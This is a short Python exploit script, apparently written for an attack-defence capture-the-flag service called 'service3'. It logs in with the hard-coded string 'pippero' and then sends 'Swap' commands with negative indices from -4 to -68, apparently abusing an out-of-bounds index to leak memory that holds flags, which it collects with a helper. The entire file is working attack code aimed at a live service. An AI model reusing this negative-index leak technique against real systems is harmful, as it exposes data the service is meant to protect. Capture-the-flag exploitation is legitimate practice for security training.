#!/usr/bin/env python3

from service3_common import connect, extract_flags


def exploit():
    io = connect()
    s = b""
    io.sendline(b"pippero")
    io.sendline(b"pippero")
    io.recvuntil(b"Ready")
    for i in range(-4, -69, -1):
        io.sendline(f"Swap {i}".encode())
        s += io.recvuntil(b"Ready")
    extract_flags(s, True)


if __name__ == "__main__":
    exploit()
